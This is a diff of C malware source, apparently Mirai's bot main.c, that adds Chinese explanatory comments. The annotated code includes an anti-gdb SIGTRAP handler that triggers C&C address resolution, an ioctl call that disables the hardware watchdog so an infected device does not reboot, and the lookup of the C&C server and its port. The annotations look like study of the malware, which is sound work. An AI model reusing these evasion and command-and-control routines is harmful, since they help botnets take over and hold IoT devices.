@@ -67,15 +67,20 @@ int main(int argc, char **args)
     sigaddset(&sigs, SIGINT);
     sigprocmask(SIG_BLOCK, &sigs, NULL);    //屏蔽SIG_BLOCK信号
     signal(SIGCHLD, SIG_IGN);       //忽略子进程的信号
-    signal(SIGTRAP, &anti_gdb_entry);   //反gdb调试
+    //真的做了反gdb调试？
+    signal(SIGTRAP, &anti_gdb_entry);   //如果出现SIGTRAP信号，也就是调试器产生的信号，就会设置resolve_func【解析C&C域名的ip】
 
     // Prevent watchdog from rebooting device
-    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
+    //设置watchdog设备，
+    if ((wfd = open("/dev/watchdog", 2)) != -1 ||   //O_RDWR
         (wfd = open("/dev/misc/watchdog", 2)) != -1)
     {
         int one = 1;
-
-        ioctl(wfd, 0x80045704, &one);
+        //watchdog.h
+        //#define	WDIOS_DISABLECARD	0x0001 【https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/watchdog.h#L53】
+        //#define	WDIOC_SETOPTIONS	_IOR(WATCHDOG_IOCTL_BASE, 4, int)   -> 0x5704
+        //https://www.kernel.org/doc/Documentation/watchdog/watchdog-api.txt
+        ioctl(wfd, 0x80045704, &one);   
         close(wfd);
         wfd = 0;
     }
@@ -357,7 +362,8 @@ static void anti_gdb_entry(int sig)
     resolve_func = resolve_cnc_addr;
 }
 
-static void resolve_cnc_addr(void)
+//解析C&C服务器，存储到srv_addr中
+static void resolve_cnc_addr(void)  
 {
     struct resolv_entries *entries;
 
@@ -375,7 +381,7 @@ static void resolve_cnc_addr(void)
     resolv_entries_free(entries);
 
     table_unlock_val(TABLE_CNC_PORT);
-    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
+    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));  //23
     table_lock_val(TABLE_CNC_PORT);
 
 #ifdef DEBUG
